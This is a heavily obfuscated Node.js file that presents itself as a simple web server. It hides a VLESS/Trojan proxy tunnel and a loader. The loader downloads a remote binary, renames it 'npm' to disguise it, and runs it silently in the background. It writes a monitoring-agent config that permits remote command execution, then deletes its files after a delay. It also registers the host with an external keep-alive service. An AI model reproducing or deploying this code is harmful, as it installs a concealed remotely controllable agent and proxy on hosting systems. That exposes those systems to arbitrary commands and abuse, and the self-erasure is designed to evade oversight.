const _0x235894=_0x3cf3;function _0x3cf3(_0x5522d5,_0x3f979d){const _0x53e2be=_0x53e2();return _0x3cf3=function(_0x3cf377,_0x1b3238){_0x3cf377=_0x3cf377-0x174;let _0x5b0fbd=_0x53e2be[_0x3cf377];return _0x5b0fbd;},_0x3cf3(_0x5522d5,_0x3f979d);}(function(_0x2dd114,_0x5c5775){const _0x53aff0=_0x3cf3,_0x217b7b=_0x2dd114();while(!![]){try{const _0x1e7259=-parseInt(_0x53aff0(0x189))/0x1*(parseInt(_0x53aff0(0x1cc))/0x2)+-parseInt(_0x53aff0(0x1cf))/0x3*(-parseInt(_0x53aff0(0x193))/0x4)+parseInt(_0x53aff0(0x1c1))/0x5+-parseInt(_0x53aff0(0x1d6))/0x6*(parseInt(_0x53aff0(0x1d8))/0x7)+-parseInt(_0x53aff0(0x1bb))/0x8+-parseInt(_0x53aff0(0x183))/0x9+parseInt(_0x53aff0(0x1e1))/0xa;if(_0x1e7259===_0x5c5775)break;else _0x217b7b['push'](_0x217b7b['shift']());}catch(_0x163b24){_0x217b7b['push'](_0x217b7b['shift']());}}}(_0x53e2,0xd1922));const os=require('os'),http=require(_0x235894(0x197)),fs=require('fs'),axios=require(_0x235894(0x1d3)),net=require(_0x235894(0x1a8)),path=require(_0x235894(0x1a2)),crypto=require(_0x235894(0x191)),{Buffer}=require(_0x235894(0x1a5)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x235894(0x194)]['UUID']||_0x235894(0x1c0),NEZHA_SERVER=process[_0x235894(0x194)][_0x235894(0x1b1)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x235894(0x194)][_0x235894(0x1b2)]||'',DOMAIN=process[_0x235894(0x194)][_0x235894(0x1c9)]||_0x235894(0x17e),AUTO_ACCESS=process['env'][_0x235894(0x198)]||!![],WSPATH=process[_0x235894(0x194)][_0x235894(0x1c4)]||UUID[_0x235894(0x177)](0x0,0x8),SUB_PATH=process['env'][_0x235894(0x1c6)]||_0x235894(0x1b7),NAME=process[_0x235894(0x194)][_0x235894(0x1d2)]||_0x235894(0x18e),PORT=process[_0x235894(0x194)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x28c38b=_0x235894;try{const _0x2dfaae=await axios['get'](_0x28c38b(0x1c7)),_0x59d275=_0x2dfaae[_0x28c38b(0x1e4)];ISP=(_0x59d275['country']+'-'+_0x59d275['asOrganization'])[_0x28c38b(0x1ee)](/ /g,'_');}catch(_0x5bf53e){ISP='Unknown';}};GetISP();const httpServer=http['createServer']((_0x5f2aa2,_0x181b59)=>{const _0x3c1b2f=_0x235894;if(_0x5f2aa2[_0x3c1b2f(0x17b)]==='/'){const _0x1f858d=path[_0x3c1b2f(0x1ce)](__dirname,_0x3c1b2f(0x1b0));fs[_0x3c1b2f(0x185)](_0x1f858d,_0x3c1b2f(0x1dc),(_0x521f2f,_0x19adfd)=>{const _0x30daf3=_0x3c1b2f;if(_0x521f2f){_0x181b59['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x181b59[_0x30daf3(0x186)]('Hello\x20world!');return;}_0x181b59[_0x30daf3(0x1ef)](0xc8,{'Content-Type':_0x30daf3(0x17f)}),_0x181b59[_0x30daf3(0x186)](_0x19adfd);});return;}else{if(_0x5f2aa2['url']==='/'+SUB_PATH){const _0x468d46=_0x3c1b2f(0x1f3)+UUID+'@'+DOMAIN+_0x3c1b2f(0x1bf)+DOMAIN+_0x3c1b2f(0x1ea)+DOMAIN+_0x3c1b2f(0x19e)+WSPATH+'#'+NAME+'-'+ISP,_0x221386=_0x3c1b2f(0x1d0)+UUID+'@'+DOMAIN+_0x3c1b2f(0x18c)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x3c1b2f(0x19e)+WSPATH+'#'+NAME+'-'+ISP,_0x553335=_0x468d46+'\x0a'+_0x221386,_0x10fe70=Buffer[_0x3c1b2f(0x1aa)](_0x553335)['toString']('base64');_0x181b59['writeHead'](0xc8,{'Content-Type':_0x3c1b2f(0x1e6)}),_0x181b59[_0x3c1b2f(0x186)](_0x10fe70+'\x0a');}else _0x181b59['writeHead'](0x194,{'Content-Type':_0x3c1b2f(0x1e6)}),_0x181b59['end'](_0x3c1b2f(0x1ad));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x235894(0x1b3),_0x235894(0x184)];function resolveHost(_0x38b24c){return new Promise((_0x17f1af,_0xcc9d78)=>{const _0x4dac90=_0x3cf3;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4dac90(0x18a)](_0x38b24c)){_0x17f1af(_0x38b24c);return;}let _0x259499=0x0;function _0x2793e1(){const _0x56d329=_0x4dac90;if(_0x259499>=DNS_SERVERS[_0x56d329(0x1e2)]){_0xcc9d78(new Error(_0x56d329(0x17c)+_0x38b24c+_0x56d329(0x1e8)));return;}const _0x267402=DNS_SERVERS[_0x259499];_0x259499++;const _0x279383=_0x56d329(0x19a)+encodeURIComponent(_0x38b24c)+_0x56d329(0x1b8);axios[_0x56d329(0x1cb)](_0x279383,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x56d329(0x1c2)](_0xdf5d5=>{const _0x274114=_0x56d329,_0x398e2a=_0xdf5d5[_0x274114(0x1e4)];if(_0x398e2a[_0x274114(0x1d9)]===0x0&&_0x398e2a[_0x274114(0x19f)]&&_0x398e2a['Answer']['length']>0x0){const _0x22b6c5=_0x398e2a[_0x274114(0x19f)]['find'](_0x5623f5=>_0x5623f5[_0x274114(0x1a9)]===0x1);if(_0x22b6c5){_0x17f1af(_0x22b6c5[_0x274114(0x1e4)]);return;}}_0x2793e1();})[_0x56d329(0x1a4)](_0x544cf2=>{_0x2793e1();});}_0x2793e1();});}function handleVlessConnection(_0x3076c1,_0x30e4fa){const _0x1f9c12=_0x235894,[_0x4b73ed]=_0x30e4fa,_0xae826b=_0x30e4fa['slice'](0x1,0x11);if(!_0xae826b[_0x1f9c12(0x1af)]((_0x741a86,_0x227566)=>_0x741a86==parseInt(uuid[_0x1f9c12(0x17a)](_0x227566*0x2,0x2),0x10)))return![];let _0x1eff54=_0x30e4fa[_0x1f9c12(0x177)](0x11,0x12)[_0x1f9c12(0x1ed)]()+0x13;const _0x268236=_0x30e4fa['slice'](_0x1eff54,_0x1eff54+=0x2)[_0x1f9c12(0x18f)](0x0),_0x197983=_0x30e4fa['slice'](_0x1eff54,_0x1eff54+=0x1)[_0x1f9c12(0x1ed)](),_0x5e2185=_0x197983==0x1?_0x30e4fa[_0x1f9c12(0x177)](_0x1eff54,_0x1eff54+=0x4)['join']('.'):_0x197983==0x2?new TextDecoder()[_0x1f9c12(0x1ba)](_0x30e4fa[_0x1f9c12(0x177)](_0x1eff54+0x1,_0x1eff54+=0x1+_0x30e4fa[_0x1f9c12(0x177)](_0x1eff54,_0x1eff54+0x1)['readUInt8']())):_0x197983==0x3?_0x30e4fa[_0x1f9c12(0x177)](_0x1eff54,_0x1eff54+=0x10)[_0x1f9c12(0x1d7)]((_0x4efb6c,_0x4816a5,_0x7beb74,_0x5b22ea)=>_0x7beb74%0x2?_0x4efb6c[_0x1f9c12(0x18d)](_0x5b22ea[_0x1f9c12(0x177)](_0x7beb74-0x1,_0x7beb74+0x1)):_0x4efb6c,[])[_0x1f9c12(0x1d4)](_0x85c8b8=>_0x85c8b8[_0x1f9c12(0x18f)](0x0)[_0x1f9c12(0x178)](0x10))[_0x1f9c12(0x1ce)](':'):'';_0x3076c1[_0x1f9c12(0x199)](new Uint8Array([_0x4b73ed,0x0]));const _0x477c17=createWebSocketStream(_0x3076c1);return resolveHost(_0x5e2185)[_0x1f9c12(0x1c2)](_0x48dfac=>{const _0x2f6f84=_0x1f9c12;net[_0x2f6f84(0x1be)]({'host':_0x48dfac,'port':_0x268236},function(){const _0x208bd5=_0x2f6f84;this[_0x208bd5(0x17d)](_0x30e4fa['slice'](_0x1eff54)),_0x477c17['on']('error',()=>{})[_0x208bd5(0x1de)](this)['on']('error',()=>{})[_0x208bd5(0x1de)](_0x477c17);})['on'](_0x2f6f84(0x175),()=>{});})['catch'](_0x3fa635=>{const _0x46d831=_0x1f9c12;net[_0x46d831(0x1be)]({'host':_0x5e2185,'port':_0x268236},function(){const _0x213232=_0x46d831;this[_0x213232(0x17d)](_0x30e4fa['slice'](_0x1eff54)),_0x477c17['on'](_0x213232(0x175),()=>{})[_0x213232(0x1de)](this)['on'](_0x213232(0x175),()=>{})[_0x213232(0x1de)](_0x477c17);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x2279e4,_0x1e39e8){const _0x3d0367=_0x235894;try{if(_0x1e39e8[_0x3d0367(0x1e2)]<0x3a)return![];const _0x2e1731=_0x1e39e8[_0x3d0367(0x177)](0x0,0x38)['toString'](),_0x4eb5e2=[UUID];let _0x1007b3=null;for(const _0x1142c5 of _0x4eb5e2){const _0x500136=crypto[_0x3d0367(0x19b)]('sha224')['update'](_0x1142c5)[_0x3d0367(0x1c8)](_0x3d0367(0x1f1));if(_0x500136===_0x2e1731){_0x1007b3=_0x1142c5;break;}}if(!_0x1007b3)return![];let _0x491085=0x38;_0x1e39e8[_0x491085]===0xd&&_0x1e39e8[_0x491085+0x1]===0xa&&(_0x491085+=0x2);const _0xc78fde=_0x1e39e8[_0x491085];if(_0xc78fde!==0x1)return![];_0x491085+=0x1;const _0x5bc1af=_0x1e39e8[_0x491085];_0x491085+=0x1;let _0x4e2e1a,_0x2e1e85;if(_0x5bc1af===0x1)_0x4e2e1a=_0x1e39e8[_0x3d0367(0x177)](_0x491085,_0x491085+0x4)['join']('.'),_0x491085+=0x4;else{if(_0x5bc1af===0x3){const _0x58e614=_0x1e39e8[_0x491085];_0x491085+=0x1,_0x4e2e1a=_0x1e39e8[_0x3d0367(0x177)](_0x491085,_0x491085+_0x58e614)['toString'](),_0x491085+=_0x58e614;}else{if(_0x5bc1af===0x4)_0x4e2e1a=_0x1e39e8[_0x3d0367(0x177)](_0x491085,_0x491085+0x10)['reduce']((_0x27edd9,_0x26f34b,_0x4a5eb7,_0x25abd8)=>_0x4a5eb7%0x2?_0x27edd9['concat'](_0x25abd8[_0x3d0367(0x177)](_0x4a5eb7-0x1,_0x4a5eb7+0x1)):_0x27edd9,[])['map'](_0x44131e=>_0x44131e['readUInt16BE'](0x0)['toString'](0x10))[_0x3d0367(0x1ce)](':'),_0x491085+=0x10;else return![];}}_0x2e1e85=_0x1e39e8['readUInt16BE'](_0x491085),_0x491085+=0x2;_0x491085<_0x1e39e8['length']&&_0x1e39e8[_0x491085]===0xd&&_0x1e39e8[_0x491085+0x1]===0xa&&(_0x491085+=0x2);const _0x3b46f8=createWebSocketStream(_0x2279e4);return resolveHost(_0x4e2e1a)['then'](_0x49bd25=>{net['connect']({'host':_0x49bd25,'port':_0x2e1e85},function(){const _0x563cc6=_0x3cf3;_0x491085<_0x1e39e8[_0x563cc6(0x1e2)]&&this[_0x563cc6(0x17d)](_0x1e39e8['slice'](_0x491085)),_0x3b46f8['on'](_0x563cc6(0x175),()=>{})[_0x563cc6(0x1de)](this)['on'](_0x563cc6(0x175),()=>{})[_0x563cc6(0x1de)](_0x3b46f8);})['on']('error',()=>{});})[_0x3d0367(0x1a4)](_0x578234=>{const _0x3a53e9=_0x3d0367;net[_0x3a53e9(0x1be)]({'host':_0x4e2e1a,'port':_0x2e1e85},function(){const _0x2979d2=_0x3a53e9;_0x491085<_0x1e39e8[_0x2979d2(0x1e2)]&&this['write'](_0x1e39e8[_0x2979d2(0x177)](_0x491085)),_0x3b46f8['on'](_0x2979d2(0x175),()=>{})[_0x2979d2(0x1de)](this)['on'](_0x2979d2(0x175),()=>{})[_0x2979d2(0x1de)](_0x3b46f8);})['on']('error',()=>{});}),!![];}catch(_0x584669){return![];}}wss['on'](_0x235894(0x1b5),(_0x114a9e,_0x53584e)=>{const _0x2ce34e=_0x235894,_0x11df97=_0x53584e['url']||'';_0x114a9e[_0x2ce34e(0x1c3)](_0x2ce34e(0x195),_0x4ba974=>{const _0x21134b=_0x2ce34e;if(_0x4ba974[_0x21134b(0x1e2)]>0x11&&_0x4ba974[0x0]===0x0){const _0x47bac8=_0x4ba974['slice'](0x1,0x11),_0x426ebe=_0x47bac8['every']((_0x2e640c,_0x389d1a)=>_0x2e640c==parseInt(uuid[_0x21134b(0x17a)](_0x389d1a*0x2,0x2),0x10));if(_0x426ebe){!handleVlessConnection(_0x114a9e,_0x4ba974)&&_0x114a9e[_0x21134b(0x1db)]();return;}}!handleTrojanConnection(_0x114a9e,_0x4ba974)&&_0x114a9e[_0x21134b(0x1db)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x250c8d=_0x235894,_0x3a92a9=os[_0x250c8d(0x1f2)]();return _0x3a92a9===_0x250c8d(0x190)||_0x3a92a9==='arm64'||_0x3a92a9===_0x250c8d(0x1bc)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x250c8d(0x1a0):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x25941e=_0x235894;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0xe4c39f=getDownloadUrl(),_0xd4496d=await axios({'method':_0x25941e(0x1cb),'url':_0xe4c39f,'responseType':'stream'}),_0x346ea3=fs[_0x25941e(0x1e5)](_0x25941e(0x1a1));return _0xd4496d['data']['pipe'](_0x346ea3),new Promise((_0x4321a6,_0x249320)=>{const _0xeb528c=_0x25941e;_0x346ea3['on'](_0xeb528c(0x192),()=>{const _0x17bc18=_0xeb528c;console[_0x17bc18(0x1e3)](_0x17bc18(0x1bd)),exec(_0x17bc18(0x1d5),_0x174432=>{if(_0x174432)_0x249320(_0x174432);_0x4321a6();});}),_0x346ea3['on']('error',_0x249320);});}catch(_0x3d1648){throw _0x3d1648;}},runnz=async()=>{const _0x4e299a=_0x235894;try{const _0xc67d6a=execSync(_0x4e299a(0x19c),{'encoding':_0x4e299a(0x1cd)});if(_0xc67d6a[_0x4e299a(0x19d)]()!==''){console[_0x4e299a(0x1e3)](_0x4e299a(0x1e0));return;}}catch(_0x1a1a96){}await downloadFile();let _0x267e32='',_0x2bb35d=['443',_0x4e299a(0x1df),_0x4e299a(0x1b4),'2087',_0x4e299a(0x1ec),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x119242=_0x2bb35d[_0x4e299a(0x1a7)](NEZHA_PORT)?_0x4e299a(0x18b):'';_0x267e32=_0x4e299a(0x179)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4e299a(0x1a6)+NEZHA_KEY+'\x20'+_0x119242+_0x4e299a(0x196);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4277db=NEZHA_SERVER[_0x4e299a(0x1a7)](':')?NEZHA_SERVER[_0x4e299a(0x1ab)](':')[_0x4e299a(0x174)]():'',_0x387403=_0x2bb35d[_0x4e299a(0x1a7)](_0x4277db)?_0x4e299a(0x1f0):_0x4e299a(0x187),_0x892d59=_0x4e299a(0x182)+NEZHA_KEY+_0x4e299a(0x1c5)+NEZHA_SERVER+_0x4e299a(0x1d1)+_0x387403+_0x4e299a(0x1ac)+UUID;fs[_0x4e299a(0x1e9)](_0x4e299a(0x180),_0x892d59);}_0x267e32=_0x4e299a(0x1a3);}else{console[_0x4e299a(0x1e3)](_0x4e299a(0x181));return;}}try{exec(_0x267e32,{'shell':'/bin/bash'},_0x9f0eed=>{const _0x28db97=_0x4e299a;if(_0x9f0eed)console[_0x28db97(0x175)](_0x28db97(0x188),_0x9f0eed);else console[_0x28db97(0x1e3)](_0x28db97(0x1b6));});}catch(_0x374923){console[_0x4e299a(0x175)](_0x4e299a(0x1b9)+_0x374923);}};function _0x53e2(){const _0x1a2e41=['https://arm64.ssss.nyc.mn/agent','npm','path','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','catch','buffer','\x20-p\x20','includes','net','type','from','split','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Not\x20Found\x0a','https://oooo.serv00.net/add-url','every','index.html','NEZHA_SERVER','NEZHA_KEY','8.8.4.4','2096','connection','npm\x20is\x20running','sub','&type=A','error:\x20','decode','8864776YTrFHj','aarch64','npm\x20download\x20successfully','connect',':443?encryption=none&security=tls&sni=','cc173bec-8f08-47ee-9e79-d302b45634bf','2749080PVqIGe','then','once','WSPATH','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','SUB_PATH','https://speed.cloudflare.com/meta','digest','DOMAIN','listen','get','2qAUmHd','utf-8','join','95688KKtImZ','trojan://','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','NAME','axios','map','chmod\x20+x\x20npm','6615270LrTsza','reduce','7DBjcgO','Status','post','close','utf8','Automatic\x20Access\x20Task\x20added\x20successfully','pipe','8443','npm\x20is\x20already\x20running,\x20skip\x20running...','40985020zOVetO','length','log','data','createWriteStream','text/plain','https://','\x20with\x20all\x20DNS\x20servers','writeFileSync','&fp=chrome&type=ws&host=','unlink','2083','readUInt8','replace','writeHead','true','hex','arch','vless://','pop','error','Server\x20is\x20running\x20on\x20port\x20','slice','toString','setsid\x20nohup\x20./npm\x20-s\x20','substr','url','Failed\x20to\x20resolve\x20','write','1234.abc.com','text/html','config.yaml','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','client_secret:\x20','9029502asRxTA','1.1.1.1','readFile','end','false','npm\x20running\x20error:','1628564svHWBv','test','--tls',':443?security=tls&sni=','concat','Hug','readUInt16BE','arm','crypto','finish','132WWTNGi','env','message','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','http','AUTO_ACCESS','send','https://dns.google/resolve?name=','createHash','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','trim','&path=%2F','Answer'];_0x53e2=function(){return _0x1a2e41;};return _0x53e2();}async function addAccessTask(){const _0x322105=_0x235894;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x3299dc=_0x322105(0x1e7)+DOMAIN;try{const _0x43e1b9=await axios[_0x322105(0x1da)](_0x322105(0x1ae),{'url':_0x3299dc},{'headers':{'Content-Type':'application/json'}});console['log'](_0x322105(0x1dd));}catch(_0x12d2bc){}}const delFiles=()=>{const _0x57a7f7=_0x235894;fs[_0x57a7f7(0x1eb)]('npm',()=>{}),fs[_0x57a7f7(0x1eb)](_0x57a7f7(0x180),()=>{});};httpServer[_0x235894(0x1ca)](PORT,()=>{const _0x1dc15e=_0x235894;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x1dc15e(0x1e3)](_0x1dc15e(0x176)+PORT);});
